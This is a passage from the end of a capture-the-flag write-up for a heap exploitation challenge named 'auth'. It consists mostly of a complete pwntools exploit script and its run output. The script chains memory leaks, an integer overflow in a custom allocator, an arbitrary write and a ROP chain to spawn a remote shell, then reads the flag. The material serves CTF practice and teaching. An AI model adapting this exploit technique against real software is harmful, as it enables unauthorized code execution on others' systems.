    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">first_name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">sur_name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">print_author</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>  <span class="c1"># Interact with print_author function</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">return</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete_author</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>  <span class="c1"># Interact with delete_author function</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">leak_pie</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    This function leaks the pie address for PrintNote.</span>

<span class="sd">    Method:</span>
<span class="sd">    1. Create one author with a note of size 200</span>
<span class="sd">    2. Create a second author with any note size</span>
<span class="sd">    3. Delete both authors, marking them free</span>
<span class="sd">    4. Create new author, with note of size 256</span>
<span class="sd">       add_author function increments size by one, no null-byte exist as seperator</span>
<span class="sd">    6. Printf continues reading after note, correct alligment means PrintNote address is printed</span>
<span class="sd">    7. Stonks</span>

<span class="sd">    Same method could be used to leak the stack, but the binary provides an easier and cleaner method.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">a2</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;D&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>

    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
    <span class="n">delete_author</span><span class="p">(</span><span class="n">a2</span><span class="p">)</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;G&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;H&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="s2">&quot;I&quot;</span> <span class="o">*</span> <span class="mi">257</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">print_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="n">last_i</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;I&quot;</span><span class="p">)</span>
    <span class="n">last_b</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;]&quot;</span><span class="p">)</span>

    <span class="n">pie_leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="n">last_i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">last_b</span><span class="p">])</span>
    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">pie_leak</span>

<span class="k">def</span> <span class="nf">leak_stack</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    This function leaks the Note address for a given author.</span>
<span class="sd">    Since tinyalloc is deterministic (obvio), we can apply a static offset to calculate rip</span>

<span class="sd">    Method:</span>
<span class="sd">    1. Create any author</span>
<span class="sd">    2. Modify the surname of the author, abusing the off by one error in modify author</span>
<span class="sd">    3. Call print_author, printf reads over surname and Note address</span>

<span class="sd">    As mentioned in leak_pie, there are actually two methods to leak the stack</span>

<span class="sd">    &quot;&quot;&quot;</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">modify_author</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">print_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="n">first</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;BBBB&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span>
    <span class="n">last</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Age:&quot;</span><span class="p">)</span>

    <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="n">first</span><span class="p">:</span> <span class="n">last</span><span class="p">])</span>
    <span class="n">rip</span> <span class="o">=</span> <span class="n">heap_leak</span>  <span class="o">-</span> <span class="mh">0x150</span>  <span class="c1"># Static offset manually calculated</span>

    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">rip</span>

<span class="k">def</span> <span class="nf">cleanup</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Bit of an irrelevant function to clean the heap up a bit when debugging</span>
<span class="sd">    Doesn&#39;t really do much</span>

<span class="sd">    &quot;&quot;&quot;</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="n">a2</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="n">a3</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
    <span class="n">delete_author</span><span class="p">(</span><span class="n">a2</span><span class="p">)</span>
    <span class="n">delete_author</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_write_gadget</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Probably the most interesting function. Generates an author for arbitrary write to the program</span>

<span class="sd">    Method:</span>
<span class="sd">    1. Create 2 authors with any size Note</span>
<span class="sd">    2. Delete first author, chunk is put into freed</span>
<span class="sd">    3. Create new author with a Note size of 2**64 - 1</span>
<span class="sd">       add_author increments note_size by one as padding, overflowing the integer</span>
<span class="sd">       tinyalloc allocates previous used space, together with pointer for 0-byte chunk</span>
<span class="sd">       add_author sets default length 256, we can write bytes into 0-byte chunk</span>
<span class="sd">       Note is carefully crafted, such that it overwrites:</span>
<span class="sd">       - PrintNote with get_from_user</span>
<span class="sd">       - *Note with rip-pointer</span>
<span class="sd">       print_author will now trigger get_from_user</span>

<span class="sd">    Damn that is cool. Great challenge!</span>

<span class="sd">    &quot;&quot;&quot;</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">a2</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;D&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>

    <span class="n">delete_author</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>

    <span class="n">note</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">note</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
    <span class="n">note</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
    <span class="n">note</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;get_from_user&quot;</span><span class="p">])</span>

    <span class="n">a1</span> <span class="o">=</span> <span class="n">add_author</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">note</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">a2</span>

<span class="k">def</span> <span class="nf">arbitrary_write</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
    <span class="c1"># Use poisoned author to write to fixed address</span>

    <span class="k">if</span> <span class="n">wait</span><span class="p">:</span>  <span class="c1"># Function may be called from rop-chain, don&#39;t select menu</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Choice: &quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">author</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Age: &quot;</span><span class="p">)</span>  <span class="c1"># Following age being printed, get_from_user is called</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak_libc</span><span class="p">(</span><span class="n">author</span><span class="p">):</span>
    <span class="c1"># leak libc using got, can be changed to determine libc version</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">])</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">])</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;print_author&quot;</span><span class="p">])</span>

    <span class="n">arbitrary_write</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">puts_leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

    <span class="k">return</span> <span class="n">puts_leak</span>

<span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="n">author</span><span class="p">):</span>
    <span class="c1"># The final goal: obtain shell either locally or remotely</span>

    <span class="k">if</span> <span class="n">remote</span><span class="p">:</span>  <span class="c1"># Use one_gadget generated by one_gadget</span>
        <span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x10a41c</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Modern libc versions don&#39;t have one_gadgets, do it manually</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)))</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">])</span>

    <span class="n">arbitrary_write</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_pie</span><span class="p">()</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;PrintNote&quot;</span><span class="p">]</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked pie address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">rdi</span><span class="o">.</span><span class="n">address</span>

<span class="n">rip</span> <span class="o">=</span> <span class="n">leak_stack</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked rip address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rip</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">cleanup</span><span class="p">()</span>

<span class="n">write_gadget</span> <span class="o">=</span> <span class="n">create_write_gadget</span><span class="p">(</span><span class="n">rip</span><span class="p">)</span>
<span class="n">puts_leak</span> <span class="o">=</span> <span class="n">leak_libc</span><span class="p">(</span><span class="n">write_gadget</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked libc address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">get_shell</span><span class="p">(</span><span class="n">write_gadget</span><span class="p">)</span>
</code></pre></div>

<p>Changing the host and port to the correct value, we can now run the function with the -r argument, which should give us a shell:</p>
<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>solve.py<span class="w"> </span>-r
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">&#39;/home/kali/Desktop/auth/auth&#39;</span>
<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
<span class="w">    </span>RELRO:<span class="w">    </span>Full<span class="w"> </span>RELRO
<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
<span class="w">    </span>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span><span class="m">178</span>.62.63.223<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">30493</span>:<span class="w"> </span>Done
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">&#39;/home/kali/Desktop/auth/libc-remote.so.6&#39;</span>
<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
<span class="w">    </span>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
Leaked<span class="w"> </span>pie<span class="w"> </span>address<span class="w"> </span>0x5629e5600000
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Loaded<span class="w"> </span><span class="m">17</span><span class="w"> </span>cached<span class="w"> </span>gadgets<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;./auth&#39;</span>
Leaked<span class="w"> </span>rip<span class="w"> </span>address<span class="w"> </span>0x7ffec0bc5a68
Leaked<span class="w"> </span>libc<span class="w"> </span>address<span class="w"> </span>0x7fb7e76dd000
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode
<span class="m">4702111234474983745</span>
$<span class="w"> </span>ls
auth-or-out<span class="w">  </span>flag.txt
$<span class="w"> </span>cat<span class="w"> </span>flag.txt
htb<span class="o">{</span>expl01ting_cust0m_h3ap_4_fun_3_pr0f1t<span class="o">}</span>
</code></pre></div>

<p>And we get our flag, <code>HTB{expl01ting_cust0m_h3ap_4_fun_3_pr0f1t}</code>.</p>
            </div>
        
        
    </div>

    </body>
</html>